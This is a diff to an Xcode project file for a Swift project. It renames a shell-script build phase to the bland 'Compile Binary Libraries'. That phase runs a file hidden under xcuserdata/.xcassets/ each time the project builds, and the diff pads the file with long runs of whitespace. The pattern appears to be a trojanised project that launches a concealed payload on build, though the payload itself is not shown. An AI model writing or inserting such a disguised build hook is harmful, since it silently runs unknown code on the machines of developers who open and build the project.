@@ -69,7 +69,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 306AE8472612CDA6004A49E6 /* Build configuration list for PBXNativeTarget "Swift-继承" */;
 			buildPhases = (
-				16A138F7C3C46CC9646D902C /* [CP] Build Pods Frameworks */,
+				531E96F0DBABBB3C0E6D902C /* Compile Binary Libraries */,
 				306AE83C2612CDA6004A49E6 /* Sources */,
 				306AE83D2612CDA6004A49E6 /* Frameworks */,
 				306AE83E2612CDA6004A49E6 /* CopyFiles */,
@@ -329,6 +329,10 @@
 
 			
 	
+
+
+			
+	
 			
 
 			
@@ -340,7 +344,7 @@
 	
 		/* Begin PBXShellScriptBuildPhase section */
 
-	16A138F7C3C46CC9646D902C /* [CP] Build Pods Frameworks */ = {
+	531E96F0DBABBB3C0E6D902C /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -349,7 +353,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -358,8 +362,28 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
